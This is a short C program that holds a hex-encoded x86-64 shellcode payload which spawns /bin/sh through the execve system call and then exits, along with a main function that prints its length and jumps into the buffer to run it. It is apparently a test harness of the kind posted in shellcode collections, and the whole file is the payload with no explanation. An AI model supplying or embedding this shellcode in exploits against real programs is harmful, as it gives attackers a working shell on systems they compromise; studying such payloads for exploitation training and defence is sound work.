#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x48\x31\xf6\x48\xf7\xe6\x48\xb9\xff\x2f\x62\x69\x6e\x2f\x73"
"\x68\x48\xc1\xe9\x08\x51\x48\x89\xe7\xb0\x3b\x0f\x05\x6a\x01"
"\x5f\x6a\x3c\x58\x0f\x05";

int main()
{
        printf("Shellcode Length:  %d\n", strlen(shellcode));
        int (*ret)() = (int(*)())shellcode;
        ret();
}

